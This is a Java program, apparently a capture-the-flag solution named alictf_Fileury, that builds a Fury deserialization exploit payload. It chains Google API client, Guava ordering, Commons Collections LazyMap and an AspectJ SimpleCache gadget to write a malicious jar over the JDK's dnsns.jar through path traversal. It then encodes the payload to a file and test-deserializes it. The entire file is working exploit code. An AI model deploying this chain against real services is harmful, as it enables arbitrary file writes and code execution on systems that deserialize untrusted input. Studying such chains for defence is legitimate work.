

import com.caucho.quercus.annotation.Construct;
import com.google.api.client.util.store.AbstractMemoryDataStore;
import com.google.api.client.util.store.DataStoreUtils;
import com.google.api.client.util.store.MemoryDataStoreFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

import javax.management.BadAttributeValueExpException;
import javax.swing.event.EventListenerList;
import javax.swing.undo.CompoundEdit;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.CodeSigner;
import java.security.cert.X509Certificate;
import java.util.*;
import sun.security.provider.certpath.X509CertPath;

import java.io.FileOutputStream;


public class alictf_Fileury {

    public static void main(String[] args) throws Exception {
//BadAttributeValueExpException#readObject ->
//TieMapEntry#toString -> getValue ->
//LazyMap.get ->
//SimpleCache$StoreableCachingMap.put
        String filename = "../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/dnsns.jar";
        byte[] code = Files.readAllBytes(Paths.get("evildnsns.jar"));
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = clazz.getDeclaredConstructor(String.class,int.class);
        constructor.setAccessible(true);
        HashMap storeableCachingMap = (HashMap) constructor.newInstance(".",1);
//        storeableCachingMap.put("writeToPathFILE",code);
        LazyMap lazy = (LazyMap) LazyMap.decorate(storeableCachingMap, new ConstantTransformer(code));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, filename);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        //my add
        //        Fury.deserialize ->
        //    CollectionSerializer.read ->
        //    PriorityQueue.add ->
        //    UsingToStringOrdering.compare ->
        //    DataStoreUtils.toString->
        //    AbstractMemoryDataStore.get ->
        //    IOUtils.deserialize 二次反序列化打aspectJweaver

        // 创建工厂实例
        MemoryDataStoreFactory memoryDataStoreFactory = MemoryDataStoreFactory.getDefaultInstance();

        Class<?> memoryStoreClass = Class.forName("com.google.api.client.util.store.MemoryDataStoreFactory$MemoryDataStore");
        Constructor<?> constructor1 = memoryStoreClass.getDeclaredConstructor(
                MemoryDataStoreFactory.class,
                String.class
        );
        constructor1.setAccessible(true);

        //获取UsingToStringOrdering
        Class<?> clazz1 = Class.forName("com.google.common.collect.UsingToStringOrdering");
        Field instanceField = clazz1.getDeclaredField("INSTANCE");
        instanceField.setAccessible(true);
        Comparator ordering = (Comparator) instanceField.get(null);

        AbstractMemoryDataStore store = (AbstractMemoryDataStore) constructor1.newInstance(memoryDataStoreFactory, "my-store-id");
//        AbstractMemoryDataStore objWithoutConstructor = (AbstractMemoryDataStore) createObjWithoutConstructor(AbstractMemoryDataStore.class);
        store.set("godown", badAttributeValueExpException);

        PriorityQueue queue = new PriorityQueue(2, ordering);

        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(queue, 2);

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = new Object[2];
        queueArray[0] = store;
        queueArray[1] = store;
        queueField.set(queue, queueArray);

// 6. Serialize with Fury
        System.out.println("Serializing AspectJ Chain with Fury...");
        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
        byte[] serializedInfo = fury.serialize(queue);

        String b64 = Base64.getEncoder().encodeToString(serializedInfo);
        FileOutputStream fos = new FileOutputStream("payload_aj.b64");
        fos.write(b64.getBytes());
        fos.close();
        System.out.println("AspectJ Payload saved to payload_aj.b64");

        //测试
        byte[] decoded = Base64.getDecoder().decode(b64);
        String decodedStr = new String(decoded, StandardCharsets.UTF_8);
//        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
        fury.deserialize(decoded);


    }
}